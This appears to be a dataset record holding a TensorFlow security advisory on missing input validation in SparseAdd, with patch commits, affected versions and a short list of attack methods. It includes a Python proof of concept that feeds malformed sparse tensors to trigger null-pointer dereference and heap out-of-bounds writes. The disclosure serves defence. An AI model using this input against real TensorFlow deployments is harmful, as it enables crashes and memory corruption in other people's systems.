{"description": "### Impact\nIncomplete validation in `SparseAdd` results in allowing attackers to exploit undefined behavior (dereferencing null pointers) as well as write outside of bounds of heap allocated data:\n\n```python\nimport tensorflow as tf\n\na_indices = tf.zeros([10, 97], dtype=tf.int64)\na_values = tf.zeros([10], dtype=tf.int64)\na_shape = tf.zeros([0], dtype=tf.int64)\n\nb_indices = tf.zeros([0, 0], dtype=tf.int64)\nb_values = tf.zeros([0], dtype=tf.int64)\nb_shape = tf.zeros([0], dtype=tf.int64)\n  \nthresh = 0\n\ntf.raw_ops.SparseAdd(a_indices=a_indices,\n                    a_values=a_values,\n                    a_shape=a_shape,\n                    b_indices=b_indices,\n                    b_values=b_values,\n                    b_shape=b_shape,\n                    thresh=thresh)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/656e7673b14acd7835dc778867f84916c6d1cac2/tensorflow/core/kernels/sparse_add_op.cc) has a large set of validation for the two sparse tensor inputs (6 tensors in total), but does not validate that the tensors are not empty or that the second dimension of `*_indices` matches the size of corresponding `*_shape`. This allows attackers to send tensor triples that represent invalid sparse tensors to abuse code assumptions that are not protected by validation.\n\n### Patches\nWe have patched the issue in GitHub commit [6fd02f44810754ae7481838b6a67c5df7f909ca3](https://github.com/tensorflow/tensorflow/commit/6fd02f44810754ae7481838b6a67c5df7f909ca3) followed by GitHub commit  [41727ff06111117bdf86b37db198217fd7a143cc](https://github.com/tensorflow/tensorflow/commit/41727ff06111117bdf86b37db198217fd7a143cc).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.", "methods": ["Exploits undefined behavior (dereferencing null pointers) and writes outside of bounds of heap allocated data.", "Uses invalid sparse tensor inputs to abuse code assumptions not protected by validation."]}
